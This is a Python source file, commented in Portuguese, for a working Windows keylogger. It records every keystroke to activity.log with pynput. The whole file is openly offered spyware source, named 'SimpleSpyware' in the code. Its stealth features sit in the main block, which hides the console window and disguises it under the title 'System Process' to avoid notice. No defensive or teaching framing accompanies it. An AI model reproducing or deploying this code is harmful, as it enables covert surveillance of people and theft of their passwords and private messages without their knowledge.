#!/usr/bin/env python3

""" Implementação de um keylogger simples em Python para Windows. """

import logging
from pynput import keyboard
import os

class Keylogger:
    """ Esta classe representa o código que injeta malware. """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Nome do malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Registra cada pressionamento de tecla do usuário em um arquivo de log. """
        # Inicia o listener de teclado
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

    def _on_press(self, key):
        """ Esta função trata os eventos de teclas pressionadas. """
        try:
            logging.debug(f'{key.char}')
        except AttributeError:
            logging.debug(f'{key}')

if __name__ == '__main__':
    # Configura o logger.
    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='Key: %(message)s',
    )

    # Para ocultar o script no gerenciador de tarefas, podemos usar ctypes
    try:
        import ctypes
        # Define o título do console (não necessariamente visível no gerenciador de tarefas)
        ctypes.windll.kernel32.SetConsoleTitleW("System Process")
        # Oculta a janela do console
        ctypes.windll.kernel32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except ImportError:
        logging.error("Não foi possível importar ctypes para ocultar a janela do console.")

    # Cria o keylogger.
    keylogger = Keylogger('SimpleSpyware')
    # Começa a registrar a atividade do usuário.
    try:
        keylogger.start_logging()
    except Exception as e:
        logging.error(f"Erro ao iniciar o keylogger: {e}")
